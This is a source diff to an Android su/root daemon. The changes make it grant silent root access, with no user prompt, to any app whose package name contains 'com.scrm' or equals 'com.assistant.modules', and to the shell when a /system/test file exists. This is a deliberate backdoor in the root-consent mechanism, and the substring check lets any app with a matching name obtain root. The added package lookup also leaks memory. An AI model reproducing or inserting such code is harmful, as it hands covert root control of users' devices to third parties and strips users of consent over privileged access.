@@ -17,6 +17,9 @@
 #include "pts.h"
 #include "selinux.h"
 
+#define PACKAGE_LIST_PATH "/data/system/packages.list"
+
+#define SYSTEM_TEST "/system/test"
 #define TIMEOUT     3
 
 #define LOCK_CACHE()   pthread_mutex_lock(&cache_lock)
@@ -87,12 +90,68 @@ static void database_check(su_info *info) {
 		validate_manager(info->str[SU_MANAGER], uid / 100000, &info->mgr_st);
 }
 
+char* read_file(const char *fn)
+{
+	struct stat st;
+	char *data = NULL;
+	LOGD("su: ---read_file ----\n");
+	int fd = open(fn, O_RDONLY);
+	if (fd < 0) return data;
+
+	if (fstat(fd, &st)) goto oops;
+
+	data =(char *)malloc(st.st_size + 2);
+	if (!data) goto oops;
+
+	if (read(fd, data, st.st_size) != st.st_size) goto oops;
+	close(fd);
+	data[st.st_size] = '\n';
+	data[st.st_size + 1] = 0;
+	return data;
+
+	oops:
+	close(fd);
+	if (data) free(data);
+	return NULL;
+}
+
+const char* resolve_package_name(int uid) {
+	char *packages = read_file(PACKAGE_LIST_PATH);
+	LOGD("su: ----resolve_package_name ----\n");
+	if (packages == NULL) {
+        return "";
+	}
+
+	char *p = packages;
+	while (*p) {
+		char *line_end = strstr(p, "\n");
+		if (line_end == NULL)
+			break;
+
+		char *token;
+		char *pkgName = strtok_r(p, " ", &token);
+		if (pkgName != NULL) {
+			char *pkgUid = strtok_r(NULL, " ", &token);
+			if (pkgUid != NULL) {
+				char *endptr;
+				errno = 0;
+				int pkgUidInt = strtoul(pkgUid, &endptr, 10);
+				if ((errno == 0 && endptr != NULL && !(*endptr)) && pkgUidInt == uid)
+					return strdup(pkgName);
+			}
+		}
+		p = ++line_end;
+	}
+	free(packages);
+	return "";
+}
+
 static struct su_info *get_su_info(unsigned uid) {
 	su_info *info;
 	bool cache_miss = false;
 
 	LOCK_CACHE();
-
+	LOGD("su: ----get_su_info ----\n");
 	if (cache && cache->uid == uid) {
 		info = cache;
 	} else {
@@ -114,7 +173,7 @@ static struct su_info *get_su_info(unsigned uid) {
 
 	UNLOCK_CACHE();
 
-	LOGD("su: request from uid=[%d] (#%d)\n", info->uid, ++info->count);
+	LOGD("su: 0304  request from uid=[%d] (#%d)\n", info->uid, ++info->count);
 
 	// Lock before the policy is determined
 	info->lock();
@@ -144,6 +203,26 @@ static struct su_info *get_su_info(unsigned uid) {
 			case ROOT_ACCESS_APPS_AND_ADB:
 			default:
 				break;
+		}
+		LOGD("su: ----start silent su access ----\n");
+        const char *packageName = resolve_package_name(info->uid);
+        const char *scrm="com.scrm";
+		LOGD("su: packageName=[%s]\n", packageName);
+		if((strstr(packageName,scrm) != NULL) || (!strcmp(packageName, "com.assistant.modules")) || (info->uid % 100000) == (info->mgr_st.st_uid % 100000)){
+			LOGD("su: scrm apk silent su access\n");
+			info->access = SILENT_SU_ACCESS;
+		} else{
+		    if(!strcmp(packageName, "com.android.shell")){
+                if((access("/system/test",F_OK)) != -1){
+                    info->access = SILENT_SU_ACCESS;
+                } else{
+                    LOGD("su: shell  deny \n");
+                    info->access.policy = DENY;
+                }
+		    } else{
+                LOGD("other apk  deny \n");
+                info->access.policy = DENY;
+		    }
 		}
 
 		// If it's the manager, allow it silently
@@ -185,6 +264,7 @@ static struct su_info *get_su_info(unsigned uid) {
 	return info;
 }
 
+
 static void set_identity(unsigned uid) {
 	/*
 	 * Set effective uid back to root, otherwise setres[ug]id will fail
@@ -200,6 +280,10 @@ static void set_identity(unsigned uid) {
 		PLOGE("setresuid (%u)", uid);
 	}
 }
+
+
+
+
 
 void su_daemon_handler(int client, struct ucred *credential) {
 	LOGD("su: request from pid=[%d], client=[%d]\n", credential->pid, client);
@@ -378,7 +462,7 @@ void su_daemon_handler(int client, struct ucred *credential) {
 		PLOGE("exec");
 		exit(EXIT_FAILURE);
 	} else {
-		LOGW("su: request rejected (%u->%u)", info->uid, ctx.req.uid);
+		LOGW("su: 0504 request rejected (%u->%u)", info->uid, ctx.req.uid);
 		fprintf(stderr, "%s\n", strerror(EACCES));
 		exit(EXIT_FAILURE);
 	}
